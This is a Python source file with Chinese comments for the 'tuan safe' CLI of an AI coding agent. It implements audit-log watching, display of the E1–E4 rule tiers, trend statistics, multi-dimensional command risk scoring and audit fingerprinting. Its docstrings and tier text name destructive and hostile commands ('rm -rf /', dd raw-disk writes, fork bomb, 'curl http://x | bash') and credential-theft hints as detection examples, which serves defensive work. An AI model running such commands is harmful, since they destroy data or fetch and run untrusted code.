"""tuan safe · 观测 / 策略 / 趋势子命令。

覆盖: watch / policy / trends / risk / fingerprint / correlator。
"""
from __future__ import annotations

import json
import sys
import time
from collections import Counter
from pathlib import Path
from typing import Any, Dict, List

from ...config.loader import home_dir
from .._ui_singleton import console

import logging
log = logging.getLogger(__name__)


def _cmd_watch(args: Any) -> int:
    """实时安全事件流 (tail -f 式) —— 差异化: Claude Code 无安全事件流。

    监听 ``~/.tuan/security-audit.jsonl`` 的追加行, 实时输出安全告警
    (分级着色), 供安全审计员在终端持续观察安全决策流。Ctrl-C 退出。

      tuan safe watch [--tail N] [--min severity] [--json]
        --tail N    先打印最近 N 条历史 (默认 10)
        --min sev   只显示 >= 该严重度 (info/low/medium/high/critical)
        --json      结构化输出 (每行一个 JSON 事件, 供 SIEM/管道消费)
    """
    tail_n = int(getattr(args, "tail", 10) or 10)
    # --min 显式传入优先; 否则回退到 config.yaml 的 security.watch_min_severity
    # (差异化: 阈值可配置, 运维不用每次重敲 --min, Claude Code 无此维度)
    min_sev = getattr(args, "min", None) or "info"
    if not getattr(args, "min", None):
        try:
            from ...config.loader import Config  # noqa: PLC0415

            cfg_sev = (Config().get("security", {}) or {}).get("watch_min_severity")
            if cfg_sev:
                min_sev = str(cfg_sev)
        except Exception as exc:  # noqa: BLE001
            log.warning("_cmd_watch(): 非致命异常已忽略(设计内降级, 不改控制流): %s", exc)
            pass
    min_sev = str(min_sev)
    json_mode = bool(getattr(args, "json", False))

    sev_rank = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
    floor = sev_rank.get(min_sev, 0)
    sev_color = {"info": "dim", "low": "cyan", "medium": "yellow",
                 "high": "orange", "critical": "red"}

    audit_path = Path(home_dir()) / "security-audit.jsonl"

    def _render(ev: dict) -> None:
        sev = str(ev.get("severity", "info"))
        color = sev_color.get(sev, "dim")
        ts = ev.get("timestamp", "")
        if isinstance(ts, (int, float)):
            from datetime import datetime as _dt
            ts = _dt.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
        etype = ev.get("event_type", "?")
        source = ev.get("source", "")
        payload = ev.get("payload", {}) or {}
        cmd = str(payload.get("command", ""))[:90]
        if json_mode:
            sys.stdout.write(json.dumps(ev, ensure_ascii=False) + "\n")
            sys.stdout.flush()
            return
        console.print(f"[{color}]{sev:<8}[/{color}] "
                      f"[dim]{ts}[/dim]  {etype}  "
                      f"[dim]({source})[/dim]")
        if cmd:
            console.print(f"          [dim]cmd: {cmd}[/dim]")

    if not audit_path.exists():
        console.print(f"[dim]审计日志不存在: {audit_path}[/dim]")
        console.print("[dim]提示: 运行一次 tuan safe status 或任何会话产生安全事件后开始监听[/dim]")

    # 先打印历史尾
    if audit_path.exists():
        try:
            with audit_path.open("r", encoding="utf-8", errors="replace") as fh:
                lines = [ln for ln in fh if ln.strip()]
            for ln in lines[-tail_n:]:
                try:
                    ev = json.loads(ln)
                    if sev_rank.get(str(ev.get("severity", "info")), 0) >= floor:
                        _render(ev)
                except (json.JSONDecodeError, ValueError):
                    continue
        except OSError as exc:
            console.print(f"[red]读取审计日志失败: {exc}[/red]")
            return 1

    console.print(f"\n[dim]监听中: {audit_path} (Ctrl-C 退出, --min {min_sev})[/dim]")
    try:
        with audit_path.open("r", encoding="utf-8", errors="replace") as fh:
            # 跳到文件末尾
            fh.seek(0, 2)
            while True:
                line = fh.readline()
                if not line:
                    time.sleep(0.2)
                    continue
                line = line.strip()
                if not line:
                    continue
                try:
                    ev = json.loads(line)
                except (json.JSONDecodeError, ValueError):
                    continue
                if sev_rank.get(str(ev.get("severity", "info")), 0) >= floor:
                    _render(ev)
    except KeyboardInterrupt:
        console.print("\n[dim]停止监听[/dim]")
        return 0
    except OSError as exc:
        console.print(f"[red]监听中断: {exc}[/red]")
        return 1


def _cmd_policy(args: Any) -> int:
    """安全规则层级透明度 (第 30 个独特功能)。

    同时暴露 policy 引擎的可移植导出/统计/热重载 (第 62 个独特功能):
      tuan safe policy --export       # 导出全部规则为 YAML (可版本化/审计)
      tuan safe policy --stats        # 规则引擎统计 (按来源/动作/严重度)
      tuan safe policy --reload       # 热重载用户 YAML (改规则后立即生效)
      tuan safe policy --json         # 机器可读 (第 30 个独特功能)
    """
    json_mode = bool(getattr(args, "json", False))
    export_fmt = getattr(args, "export", None)
    stats_only = bool(getattr(args, "stats", False))
    do_reload = bool(getattr(args, "reload", False))

    # -- 规则引擎导出/统计/热重载 (第 62 个独特功能) --
    if export_fmt or stats_only or do_reload:
        from ...core.security_policy import get_policy_engine
        engine = get_policy_engine()
        if do_reload:
            n = engine.reload()
            console.print(f"[green]✓ 策略已热重载[/green] 重新加载 {n} 条规则 "
                          f"(用户 YAML 改动已生效)")
            return 0
        if export_fmt == "yaml":
            sys.stdout.write(engine.export_rules() + "\n")
            return 0
        if export_fmt == "json":
            rules = engine.list_rules()
            sys.stdout.write(json.dumps(
                [r.to_dict() for r in rules], ensure_ascii=False, indent=2) + "\n")
            return 0
        if stats_only:
            st = engine.stats()
            if json_mode:
                sys.stdout.write(json.dumps(st, ensure_ascii=False, indent=2) + "\n")
                return 0
            console.print("\n[bold]=== 策略引擎统计 ===[/bold]\n")
            console.print(f"  规则总数: {st.get('total', 0)}")
            by_src = st.get("by_source", {}) or {}
            if by_src:
                console.print("  按来源:")
                for src, n in sorted(by_src.items(), key=lambda kv: -kv[1]):
                    console.print(f"    {src}  {n}")
            by_act = st.get("by_action", {}) or {}
            if by_act:
                console.print("  按动作:")
                for act, n in sorted(by_act.items(), key=lambda kv: -kv[1]):
                    console.print(f"    {act}  {n}")
            console.print("\n[dim]提示: --export yaml/json 导出可审计; --reload 热重载[/dim]")
            return 0

    # -- E1-E4 层级透明度 (第 30 个独特功能, 原主体) --
    from ...ext.safety_patterns import (
        _CRITICAL_PATTERNS,
        _EXTREME_PATTERNS,
        _HIGH_PATTERNS,
        _MEDIUM_PATTERNS,
        _RAW_DISK,
    )

    # E1 红线 (致命, 不可绕过)
    e1_count = len(_EXTREME_PATTERNS)
    # E2 高危 (需确认, YOLO 也拒绝)
    e2_count = len(_CRITICAL_PATTERNS) + len(_RAW_DISK)
    # E3 中危 (需确认)
    e3_count = len(_HIGH_PATTERNS)
    # E4 低危 (提示)
    e4_count = len(_MEDIUM_PATTERNS)

    total = e1_count + e2_count + e3_count + e4_count
    tiers: list[dict[str, Any]] = [
        {"tier": "E1", "severity": "extreme", "count": e1_count,
         "semantics": "系统毁灭级: rm -rf /, dd 直写裸盘, mkfs, fork bomb, chmod -R 000 /",
         "action": "硬红线, 永远拒绝 (含 YOLO)"},
        {"tier": "E2", "severity": "critical", "count": e2_count,
         "semantics": "破坏级: 递归删除, 磁盘操作, 权限篡改, 危险重定向",
         "action": "拒绝 (YOLO 也不放行)"},
        {"tier": "E3", "severity": "high", "count": e3_count,
         "semantics": "高危写操作: 系统目录, 敏感配置, 批处理破坏",
         "action": "需确认 (confirm)"},
        {"tier": "E4", "severity": "medium", "count": e4_count,
         "semantics": "常规风险: 环境变更, 网络访问, 文件生成",
         "action": "提示 (提示性拦截)"},
    ]

    if json_mode:
        sys.stdout.write(json.dumps({
            "total_patterns": total,
            "tiers": tiers,
            "note": "E1-E4 分级: 级别越高越危险; "
                    "E1/E2 不可绕过 (安全引擎红线兜底)",
        }, ensure_ascii=False, indent=2) + "\n")
        return 0

    console.print("\n[bold]=== 安全规则层级 (E1-E4) ===[/bold]\n")
    console.print(f"  内置规则模式: [bold]{total}[/bold] 条 (跨 {len(tiers)} 个严重度)\n")
    for tier in tiers:
        color = {"extreme": "red", "critical": "red",
                 "high": "yellow", "medium": "dim"}.get(str(tier["severity"]), "dim")
        color = str(color)
        console.print(f"  [{color}]{tier['tier']}[/{color}] {tier['severity']:<9} "
                      f"[bold]{tier['count']:3d}[/bold] 条")
        console.print(f"         [dim]{tier['semantics']}[/dim]")
        console.print(f"         裁决: {tier['action']}")

    console.print("\n[bold]覆盖面[/bold]")
    console.print("  E1 红线兜底: 安全引擎 is_redline 在任何自动放行前检查, "
                  "YOLO 也不能跳过")
    console.print("  E2 破坏级: 工具权限层 _hardening_confirm 走硬红线拒绝")
    console.print("  E3/E4: 提示/确认, 用户可 white-list 减负 (tuan safe allow)")
    console.print("\n[dim]说明: 规则表位于 ext/safety_patterns.py, 本命令让策略可审计; "
                  "tuan safe scan 用同一规则库扫描工作区[/dim]")
    return 0


def _cmd_trends(args: Any) -> int:
    """安全事件流趋势分析 (第 33 个独特功能)。

    对持久化的安全事件流 (``~/.tuan/security-audit.jsonl`` 或
    ``~/.tuan/audit/security_events.jsonl``) 做**跨会话聚合分析** —— 不是
    ``safe watch`` 的逐条 tail, 也不是 ``harden audit-export`` 的原始导出,
    而是回答「安全态势在变好还是变坏」:
      - 严重度分布 (info/low/medium/high/critical);
      - 时间趋势 (按天/按小时, 哪段时间事件最密);
      - Top 攻击源 (哪个模块/来源触发最多);
      - Top 命令模式 (哪些危险命令反复出现);
      - 安全态势分 (0-100, 事件越少越严重度越低分越高)。
    Claude Code 的安全事件流完全不可见, 这是纯差异化能力 (事件流可观测性)。
    """
    json_mode = bool(getattr(args, "json", False))
    window_h = int(getattr(args, "window", 24 * 7) or 24 * 7)  # 默认近 7 天

    # 解析事件源 (优先已存在且非空的, 否则回退主路径)
    try:
        home = Path(home_dir())
    except Exception:  # noqa: BLE001
        home = Path.home() / ".tuan"
    candidates = [
        home / "security-audit.jsonl",
        home / "audit" / "security_events.jsonl",
    ]
    src = None
    for cand in candidates:
        try:
            if cand.exists() and cand.stat().st_size > 0:
                src = cand
                break
        except OSError:
            continue
    if src is None:
        if json_mode:
            sys.stdout.write(json.dumps({
                "events": 0,
                "note": "无持久化安全事件流; 运行一次会话或 tuan safe status 生成",
                "sources": [str(p) for p in candidates],
            }, ensure_ascii=False, indent=2) + "\n")
        else:
            console.print("[dim]暂无持久化安全事件流 (先跑一次 tuan chat / tuan safe status 产生事件)[/dim]")
            console.print(f"[dim]期望路径: {candidates[0]} 或 {candidates[1]}[/dim]")
        return 0

    # 读取全部事件行
    events: List[Dict[str, Any]] = []
    try:
        with src.open("r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    events.append(json.loads(line))
                except (json.JSONDecodeError, ValueError):
                    continue
    except OSError as exc:
        console.print(f"[red]读取安全事件流失败: {exc}[/red]")
        return 1

    # 时间窗口过滤
    now = time.time()
    cutoff = now - window_h * 3600.0
    in_window = []
    for ev in events:
        ts = ev.get("timestamp")
        if isinstance(ts, (int, float)):
            if ts < cutoff:
                continue
        in_window.append(ev)

    # --- 聚合统计 ---
    sev_order = ("info", "low", "medium", "high", "critical")
    sev_counts: Counter[str] = Counter()
    by_source: Counter[str] = Counter()
    by_type: Counter[str] = Counter()
    by_day: Counter[str] = Counter()
    top_commands: Counter[str] = Counter()
    for ev in in_window:
        sev = str(ev.get("severity", "info") or "info")
        sev_counts[sev] += 1
        by_source[str(ev.get("source", "?") or "?")] += 1
        by_type[str(ev.get("event_type", "?") or "?")] += 1
        ts = ev.get("timestamp")
        if isinstance(ts, (int, float)):
            from datetime import datetime as _dt
            day = _dt.fromtimestamp(ts).strftime("%m-%d")
            by_day[day] += 1
        payload = ev.get("payload", {}) or {}
        cmd = str(payload.get("command", "") or "")
        if cmd:
            top_commands[cmd[:80]] += 1

    total = len(in_window)
    # 安全态势分: 100 - 加权扣分 (critical 大扣, high 中扣, medium 小扣)
    # 基线为「窗口内 0 事件 = 100 分」。
    weighted = (sev_counts.get("critical", 0) * 8
                + sev_counts.get("high", 0) * 3
                + sev_counts.get("medium", 0) * 1)
    score = max(0, min(100, 100 - weighted))

    if json_mode:
        sys.stdout.write(json.dumps({
            "source": str(src),
            "window_hours": window_h,
            "events_in_window": total,
            "events_total": len(events),
            "posture_score": score,
            "by_severity": dict(sev_counts),
            "by_source": dict(by_source.most_common(10)),
            "by_type": dict(by_type.most_common(10)),
            "by_day": dict(sorted(by_day.items())),
            "top_commands": [{"command": c, "count": n} for c, n in top_commands.most_common(10)],
        }, ensure_ascii=False, indent=2) + "\n")
        return 0

    sev_color = {"info": "dim", "low": "cyan", "medium": "yellow",
                 "high": "orange", "critical": "red"}
    console.print("\n[bold]=== 安全事件流 · 趋势分析 ===[/bold]\n")
    console.print(f"  源: {src}")
    console.print(f"  窗口: 近 {window_h}h | 事件 {total} 条 "
                  f"(累计 {len(events)} 条)")

    # 态势分
    grade = ("优" if score >= 90 else "良" if score >= 75
             else "中" if score >= 50 else "差")
    console.print(f"\n  [bold]安全态势分[/bold]: {score}/100 ([green]{grade}[/green])")
    if weighted == 0:
        console.print("  [dim]窗口内无 medium+ 事件, 态势干净[/dim]")

    # 严重度分布
    console.print("\n  [bold]严重度分布[/bold]")
    for sev in sev_order:
        n = sev_counts.get(sev, 0)
        if n == 0 and total == 0:
            continue
        color = sev_color.get(sev, "dim")
        bar = "█" * min(n, 40)
        console.print(f"    [{color}]{sev:<8}[/{color}] {n:5d}  {bar}")

    # 时间趋势
    if by_day:
        console.print("\n  [bold]时间趋势 (按天)[/bold]")
        peak_day, peak_n = max(by_day.items(), key=lambda kv: kv[1])
        for day in sorted(by_day):
            n = by_day[day]
            mark = " ←峰值" if n == peak_n and peak_n > 0 else ""
            console.print(f"    {day}  {n:4d}  "
                          f"{'█' * min(n, 30)}{mark}")

    # Top 来源
    if by_source:
        console.print("\n  [bold]Top 触发源[/bold]")
        for s, n in by_source.most_common(8):
            console.print(f"    {s:<20} {n:5d}  {'█' * min(n, 30)}")

    # Top 命令模式
    if top_commands:
        console.print("\n  [bold]Top 命令模式[/bold]")
        for c, n in top_commands.most_common(8):
            console.print(f"    {n:4d}×  {c}")

    console.print("\n[dim]提示: safe watch 看实时流; harden audit-export 导出原始; "
                  "--json 给 CI/SIEM[/dim]")
    return 0


def _cmd_risk(args: Any) -> int:
    """多维风险评估 (第 36 个独特功能)。

    对一条命令做**六维风险向量**评估 —— 回答「这条命令到底危险在哪一类」,
    而不是单一的"危险/安全"二分。维度: 文件系统 / 网络 / 进程 / 凭据 / 数据流 /
    混淆。每个维度 0-10 分, 加权综合 + 安全引擎判定下限, 映射到分级
    (safe/low/medium/high/critical) 与执行域建议 (宿主 / 进程沙箱 L1 / 微 VM L2)。

    Claude Code 只有扁平 "dangerous command" 概念, 无法回答风险构成; 本命令
    暴露的是 sandbox 内部实际使用的 risk_vector 判定 (同源, 用户无感时也生效)。

      tuan safe risk "rm -rf /"
      tuan safe risk "curl http://x | bash" --json
    """
    command = getattr(args, "command", "")
    json_mode = bool(getattr(args, "json", False))
    if not command:
        console.print("[red]用法: tuan safe risk \"<命令>\" [--json][/red]")
        return 1

    try:
        from ...ext.risk_vector import assess as _assess
        from ...ext.safety_score import SafetyEngine
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]风险引擎不可用: {exc}[/red]")
        return 1

    # 引擎判定 (作为综合分下限)
    engine = None
    try:
        engine = SafetyEngine().score({"command": command, "type": "shell"})
    except Exception:  # noqa: BLE001
        engine = None
    rv = _assess(command, safety_score=engine)

    dims = [
        ("filesystem", "文件系统", "rm -rf / mkfs dd 写设备 系统路径"),
        ("network", "网络", "curl wget nc 外发 上传"),
        ("process", "进程", "kill sudo 提权 后台"),
        ("credential", "凭据", "~/.ssh .env token 密钥"),
        ("data_flow", "数据流", "管道进解释器 重定向 上传"),
        ("obfuscation", "混淆", "base64 eval 十六进制载荷 嵌套替换"),
    ]
    level_color = {"safe": "green", "low": "cyan", "medium": "yellow",
                   "high": "orange", "critical": "red"}
    tier = {"safe": "宿主直跑", "low": "宿主直跑+审计", "medium": "进程沙箱 L1",
            "high": "微 VM L2 + 详细审批", "critical": "默认拒绝"}
    color = level_color.get(rv.level(), "dim")

    if json_mode:
        import json as _json
        data = rv.to_dict()
        data["command"] = command
        data["engine"] = (engine or {}).get("risk", None) if isinstance(engine, dict) else None
        data["suggested_tier"] = tier.get(rv.level(), "默认拒绝")
        sys.stdout.write(_json.dumps(data, ensure_ascii=False, indent=2) + "\n")
        return 0

    console.print("\n[bold]=== 多维风险评估 ===[/bold]\n")
    console.print(f"  命令: [dim]{command[:80]}{'…' if len(command) > 80 else ''}[/dim]")
    console.print(f"\n  [bold]综合分[/bold]: {rv.composite()}/10  "
                  f"([{color}]{rv.level().upper()}[/{color}])")
    engine_risk = (engine or {}).get("risk", None) if isinstance(engine, dict) else None
    if engine_risk:
        console.print(f"  安全引擎判定: [dim]{engine_risk}[/dim] (作为综合分下限)")
    console.print(f"  执行域建议: [bold]{tier.get(rv.level(), '默认拒绝')}[/bold]\n")

    console.print("  [bold]六维信号[/bold]")
    for attr, label, hint in dims:
        val = getattr(rv, attr, 0.0)
        bar = "█" * int(min(val, 10) * 1.5)
        dim_color = "green" if val < 2 else "cyan" if val < 4 else "yellow" if val < 6 else "red"
        console.print(f"    [{dim_color}]{label:<6}[/{dim_color}] {val:>4.1f}  {bar:<15} "
                      f"[dim]{hint}[/dim]")

    console.print("\n[dim]提示: 分级驱动 sandbox 执行域选择; "
                  "tuan safe policy 看规则表 / safe bench 跑基准[/dim]")
    return 0


def _cmd_safe_fingerprint(args: Any) -> int:
    """safe fingerprint: 审计指纹归一化查询 (第 85 个独特功能)。

    暴露 :func:`core.audit_correlation.fingerprint_of` 与
    :class:`core.audit_correlation.CorrelationAlert.to_dict` —— 把任意审计
    记录映射到稳定攻击指纹 (module+action+归一化 reason+归一化输入摘要),
    跨会话复用检测的依据; 以及把聚合告警转成可消费 dict。

    差异化价值: Claude Code 的审计日志是明文堆栈, 用户无法判断「这两次
    告警是不是同一手法」; 指纹把「同一攻击/注入被识别为同一指纹」变成
    可查询/可对比的工具, 用于 SIEM 归一化与重复检测排查。

      tuan safe fingerprint --module security --action shell_exec --reason "危险命令" --input "rm -rf /"  # 计算指纹
      tuan safe fingerprint --alert <json>   # 把告警转成 dict (SIEM 消费)
    """
    from ...core.audit_correlation import fingerprint_of, CorrelationAlert

    json_mode = bool(getattr(args, "json", False))
    alert_json = getattr(args, "alert", None)

    # --- 模式 2: 告警转 dict ---
    if alert_json:
        try:
            data = json.loads(alert_json)
        except (json.JSONDecodeError, TypeError):
            console.print("[red]告警 JSON 解析失败[/red]")
            return 1
        alert = CorrelationAlert(
            kind=data.get("kind", "burst"),
            fingerprint=data.get("fingerprint", ""),
            module=data.get("module", ""),
            action=data.get("action", ""),
            severity=data.get("severity", "low"),
            count=int(data.get("count", 0)),
            sessions=tuple(data.get("sessions", [])),
            message=data.get("message", ""),
            first_ts=float(data.get("first_ts", 0)),
            last_ts=float(data.get("last_ts", 0)),
        )
        result = alert.to_dict()
        if json_mode:
            sys.stdout.write(json.dumps(result, ensure_ascii=False, indent=2) + "\n")
        else:
            console.print(f"[bold]告警 → dict[/bold]")
            for k, v in result.items():
                console.print(f"  [cyan]{k}[/cyan]: {json.dumps(v, ensure_ascii=False)[:100]}")
        return 0

    # --- 模式 1: 计算指纹 ---
    module = getattr(args, "module", None)
    action = getattr(args, "action", None)
    reason = getattr(args, "reason", None)
    input_summary = getattr(args, "input", None)

    class _Rec:
        module = ""
        action = ""
        reasons: list = []
        input_summary = ""
        def __init__(self, m: str, a: str, rs: str, i: str) -> None:
            self.module = m
            self.action = a
            self.reasons = [rs] if rs else []
            self.input_summary = i

    if not module or not action:
        console.print("[red]需要 --module 与 --action[/red]")
        console.print("用法: tuan safe fingerprint --module <m> --action <a> [--reason <r>] [--input <s>]")
        console.print("  或: tuan safe fingerprint --alert '<json>'")
        return 1
    rec = _Rec(module, action, reason or "", input_summary or "")
    fp = fingerprint_of(rec)
    if json_mode:
        sys.stdout.write(json.dumps({
            "module": module, "action": action,
            "reason": reason, "input": input_summary,
            "fingerprint": fp,
        }, ensure_ascii=False, indent=2) + "\n")
    else:
        console.print(f"[bold]审计指纹[/bold] (同一手法 → 同一指纹)")
        console.print(f"  模块: [cyan]{module}[/cyan] · 动作: [cyan]{action}[/cyan]")
        if reason:
            console.print(f"  原因: {reason[:60]}")
        if input_summary:
            console.print(f"  输入: {input_summary[:80]}")
        console.print(f"\n  [green]指纹[/green]: [bold]{fp}[/bold]")
        console.print("\n[dim]提示: 相同指纹=跨会话同一攻击/注入手法; "
                      "与 safe audit 的 unique_signatures 配合排查[/dim]")
    return 0


def _cmd_safe_correlator(args: Any) -> int:
    """safe correlator: 审计关联器配置/状态/重置 (第 86 个独特功能)。

    暴露 :class:`core.audit_correlation.AuditCorrelator` 的**配置面与重置面**:
    - 滑动窗口时长 / 同源高频爆发阈值 / 跨会话复用阈值 / 窗口/指纹/告警上限
    - 当前窗口事件数 / 活跃指纹数 / 峰值严重度
    - ``--reset``: 清空窗口/指纹/告警状态 (防误报持续累积)

    差异化价值: Claude Code 的安全关联检测参数是硬编码黑箱, 用户无法
    查看当前阈值, 也无法在误报累积后手动清空; 本命令把这些参数与重置
    能力开放给用户, 用于调参与运维排障。

      tuan safe correlator                 # 查看当前配置 + 窗口状态
      tuan safe correlator --reset         # 清空关联状态 (窗口/指纹/告警)
      tuan safe correlator --json
    """
    from ...core.audit_correlation import AuditCorrelator

    json_mode = bool(getattr(args, "json", False))
    reset_flag = bool(getattr(args, "reset", False))

    # 构造关联器 (与 SecurityAuditor 同默认参数; 状态在内存)
    corr = AuditCorrelator()

    if reset_flag:
        corr.reset()
        if json_mode:
            sys.stdout.write(json.dumps({"reset": True}, ensure_ascii=False) + "\n")
        else:
            console.print("[green]✓ 已清空关联器状态 (窗口/指纹/告警/峰值)[/green]")
        return 0

    cfg = {
        "window_seconds": corr.window_seconds,
        "burst_threshold": corr.burst_threshold,
        "cross_session_threshold": corr.cross_session_threshold,
        "max_window_events": getattr(corr, "_max_events", None),
        "max_fingerprints": getattr(corr, "_max_fps", None),
        "max_alerts": getattr(corr, "_max_alerts", None),
    }
    stats = corr.stats()
    if json_mode:
        sys.stdout.write(json.dumps({
            "config": cfg,
            "window_events": len(corr._events),
            "active_fingerprints": len(corr._sessions),
            "alerts": stats.get("total_alerts", 0),
            "unique_signatures": stats.get("unique_signatures", 0),
        }, ensure_ascii=False, indent=2) + "\n")
        return 0

    console.print("\n[bold]=== 审计关联器 (AuditCorrelator) ===[/bold]\n")
    console.print(f"  [bold]配置[/bold]:")
    console.print(f"    滑动窗口: [cyan]{cfg['window_seconds']}s[/cyan] "
                  f"· 爆发阈值: [cyan]{cfg['burst_threshold']}[/cyan] 次 "
                  f"· 跨会话复用: [cyan]{cfg['cross_session_threshold']}[/cyan] 会话")
    console.print(f"    窗口事件上限: {cfg['max_window_events']} "
                  f"· 指纹上限: {cfg['max_fingerprints']} "
                  f"· 告警上限: {cfg['max_alerts']}")
    console.print(f"\n  [bold]当前状态[/bold]:")
    console.print(f"    窗口事件: [cyan]{len(corr._events)}[/cyan] "
                  f"· 活跃指纹: [cyan]{len(corr._sessions)}[/cyan]")
    console.print(f"    告警总数: {stats.get('total_alerts', 0)} "
                  f"· 唯一签名: {stats.get('unique_signatures', 0)}")
    console.print("\n[dim]提示: tuan safe correlator --reset 清空状态 (误报累积时); "
                  "tuan safe correlator --json 供 CI 读取[/dim]")
    return 0
